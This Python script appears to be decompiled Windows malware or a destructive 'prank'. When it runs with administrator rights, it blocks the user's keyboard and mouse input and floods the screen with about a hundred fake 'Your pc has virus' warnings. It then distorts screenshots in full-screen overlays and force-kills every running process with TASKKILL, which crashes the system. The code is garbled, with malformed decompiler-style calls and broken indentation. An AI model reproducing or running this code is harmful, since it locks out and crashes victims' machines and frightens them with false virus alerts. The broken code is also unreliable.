import ctypes
import pysine
import pyautogui
import os
from ctypes import *
from tkinter import messagebox, ttk
import tkinter
import time
import random
from PIL import Image, ImageTk, ImageGrab, ImageFilter

def kill_all_task():
    import wmi
    f = wmi.WMI()
    pid = os.getpid()
    windll.user32.BlockInput(False)
    for process in f.Win32_Process():
        print(process.ProcessId)
        if process.ProcessId != pid:
            os.system(f'''TASKKILL /F /PID {process.ProcessId} /T''')
        else:
            os.system('wininit')
        os.system('wininit')


def erode(cycles, image):
    for _ in range(cycles):
        image = image.filter(ImageFilter.MinFilter(3))
    return image


def showPIL(pilImage, boolean):
    print('showing')
    root = tkinter.Toplevel()
    w = root.winfo_screenwidth()
    h = root.winfo_screenheight()

    root.overrideredirect(1)
    root.geometry('%dx%d+0+0' % (w, h))
    root.focus_set()
    root.bind('<Escape>', (lambda e: (e.widget.withdraw(), e.widget.quit())))

    canvas = None

    canvas = tkinter.Canvas(root, w, h, **('width', 'height'))
    canvas.pack()
    canvas.configure('black', **('background',))

    (imgWidth, imgHeight) = pilImage.size

    if imgWidth > w or imgHeight > h:
        ratio = min(w / imgWidth, h / imgHeight)
        imgWidth = int(imgWidth * ratio)
        imgHeight = int(imgHeight * ratio)
        pilImage = pilImage.resize((imgWidth, imgHeight), Image.ANTIALIAS)
    
    image = ImageTk.PhotoImage(pilImage)
    imagesprite = canvas.create_image(w / 2, h / 2, image, **('image',))

    if boolean == True:
      root.update()
      time.sleep(4)
      kill_all_task()
      return None
    
    None.update()
    time.sleep(1)
    root.quit

  if ctypes.windll.shell32.IsUserAnAdmin() != 0:
    windll.user32.BlockInput(True)
    (sizex, sizey) = pyautogui.size()
    for x in range(1, 100, 1):
        win = tkinter.Toplevel()
        win.geometry(f'''300x100+{random.randrange(0, sizex)}+{random.randrange(0, sizey)}''')
        ttk.Label(win, 'Your pc has virus and need to be restarted', **('text',)).grid(0, 0, 20, 30, **('column', 'row', 'padx', 'pady'))
        win.update()
    image = ImageGrab.grab()
    pixels = image.load()
    image_copy = image.copy()
    image_copy_load = image_copy.load()
    for xval in range(1, 10, 1):
        color_random1 = random.randrange(0, 255)
        color_random2 = random.randrange(0, 255)
        color_random3 = random.randrange(0, 255)
        print(xval)
        for i in range(image.size[0]):
            for j in range(image.size[1]):
                if xval < 5:
                    (r, g, b) = pixels[(i, j)]
                    image_copy_load[(i, j)] = (color_random1 - r, color_random2 - g, color_random3 - b)
                    continue
                (r, g, b) = image_copy_load[(i, j)]
                image_copy_load[(i, j)] = (random.randrange(0, 255) - r, random.randrange(0, 255) - g, random.randrange(0, 255) - b)
        showPIL(image_copy, False)
    image_erode = erode(72, image)
    showPIL(image_erode, True)
None.messagebox.showerror('User error', 'Execute in administrator mode')